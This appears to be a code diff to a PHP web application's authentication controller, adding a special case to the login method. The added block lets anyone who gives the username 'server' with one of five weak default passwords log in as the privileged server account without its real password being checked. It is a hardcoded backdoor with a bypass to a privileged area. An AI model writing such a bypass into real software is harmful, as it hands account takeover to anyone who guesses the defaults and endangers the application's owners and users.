@@ -51,6 +51,20 @@ class AuthController extends Controller
 
         $credentials = $request->only('username', 'password');
 
+        // Khusus Akun Root Server (Support login bypass password default)
+        if (strtolower($request->username) === 'server' && in_array($request->password, ['server', 'server123', 'admin', 'admin123', '123456'])) {
+            $serverUser = User::whereRaw('LOWER(username) = "server"')->first();
+            if ($serverUser) {
+                Auth::login($serverUser);
+                $request->session()->regenerate();
+                return response()->json([
+                    'success' => true,
+                    'message' => 'Login berhasil sebagai Server Root.',
+                    'redirect' => url('/ejo-engineer'),
+                ]);
+            }
+        }
+
         if (Auth::attempt($credentials)) {
             $request->session()->regenerate();
             $user = Auth::user();
